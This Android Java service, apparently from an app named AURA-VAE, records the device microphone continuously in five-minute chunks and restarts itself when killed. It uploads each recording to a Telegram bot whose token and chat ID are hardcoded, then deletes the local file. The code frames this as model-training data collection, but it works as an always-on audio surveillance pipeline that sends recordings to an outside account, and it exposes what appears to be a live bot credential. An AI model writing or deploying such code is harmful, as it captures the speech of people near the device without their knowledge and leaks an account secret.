package com.neos.auravae;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * DataCollectionService
 * 
 * Runs in the foreground to collect audio data for model training.
 * Implements the "Fleet" strategy:
 * 1. Auto-starts on boot
 * 2. Records in chunks (to avoid huge files)
 * 3. Saves to local storage (Future: Upload to Cloud)
 */
public class DataCollectionService extends Service {
    
    private static final String TAG = "DataCollectionService";
    private static final String CHANNEL_ID = "AuraDataCollectionChannel";
    private static final int NOTIFICATION_ID = 1001;
    
    // Config: 5 minute chunks
    private static final long RECORDING_CHUNK_DURATION_MS = 5 * 60 * 1000;

    // Telegram Configuration
    private static final String BOT_TOKEN = "8225968498:AAFiZUsJbIdpENP73vh_rs0k-j8aLt0x3nQ"; 
    private static final String CHAT_ID = "7926094514"; // Updated with User ID
    private static final String TELEGRAM_API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendAudio";
    
    private MediaRecorder mediaRecorder;
    private Handler handler;
    private boolean isRecording = false;
    private File currentFile;
    private OkHttpClient httpClient;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        handler = new Handler(Looper.getMainLooper());
        httpClient = new OkHttpClient();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Start Foreground immediately
        startForeground(NOTIFICATION_ID, createNotification());

        Log.d(TAG, "Service started. Initializing recording loop...");
        startRecordingChunk();

        return START_STICKY; // Restart if killed
    }

    private void startRecordingChunk() {
        if (isRecording) {
            stopRecording();
        }

        try {
            currentFile = createOutputFile();
            Log.d(TAG, "Starting new recording chunk: " + currentFile.getAbsolutePath());

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioSamplingRate(16000); // Standard for our model
            mediaRecorder.setAudioEncodingBitRate(64000);
            mediaRecorder.setOutputFile(currentFile.getAbsolutePath());

            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;

            // Schedule stop and next chunk
            handler.postDelayed(this::rotateFile, RECORDING_CHUNK_DURATION_MS);

        } catch (IOException e) {
            Log.e(TAG, "Failed to prepare MediaRecorder", e);
            // Retry in 10 seconds if failed
            handler.postDelayed(this::startRecordingChunk, 10000);
        } catch (Exception e) {
            Log.e(TAG, "Generic error starting recording", e);
            handler.postDelayed(this::startRecordingChunk, 10000);
        }
    }

    private void rotateFile() {
        Log.d(TAG, "rotating file...");
        stopRecording();
        uploadToCloud(currentFile);
        startRecordingChunk();
    }

    private void stopRecording() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
            } catch (RuntimeException e) {
                // Handle case where stop is called immediately usually
                Log.e(TAG, "Error stopping recorder", e);
            }
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;
        }
    }

    // Upload to Telegram
    private void uploadToCloud(File file) {
        if (file == null || !file.exists()) return;
        
        if (BOT_TOKEN.contains("YOUR_BOT_TOKEN")) {
            Log.e(TAG, "Cannot upload: BOT_TOKEN not set in DataCollectionService.java");
            return;
        }

        Log.i(TAG, "Uploading file to Telegram: " + file.getName());
        
        // Run in background thread
        new Thread(() -> {
            try {
                RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", CHAT_ID)
                        .addFormDataPart("caption", "Fleet Audio: " + file.getName())
                        .addFormDataPart("audio", file.getName(),
                                RequestBody.create(file, MediaType.parse("audio/mp4")))
                        .build();

                Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendAudio")
                        .post(requestBody)
                        .build();

                try (Response response = httpClient.newCall(request).execute()) {
                    if (response.isSuccessful()) {
                        Log.i(TAG, "Upload successful: " + response.body().string());
                        // Delete local file to save space
                        if (file.delete()) {
                            Log.d(TAG, "Local file deleted: " + file.getName());
                        }
                    } else {
                        Log.e(TAG, "Upload failed: " + response.code() + " " + response.message());
                        Log.e(TAG, "Response: " + response.body().string());
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error uploading to Telegram", e);
            }
        }).start();
    }

    private File createOutputFile() {
        String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
        String filename = "Aura_Fleet_" + timestamp + ".m4a";
        File dir = new File(getExternalFilesDir(null), "fleet_recordings");
        if (!dir.exists()) {
            dir.mkdirs();
        }
        return new File(dir, filename);
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("AURA-VAE Data Collection")
                .setContentText("Collecting fleet audio data in background...")
                .setSmallIcon(android.R.drawable.ic_btn_speak_now) // Default icon, replace with app icon
                .setContentIntent(pendingIntent)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Aura Collection Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public void onDestroy() {
        stopRecording();
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null; // pure start service
    }
}
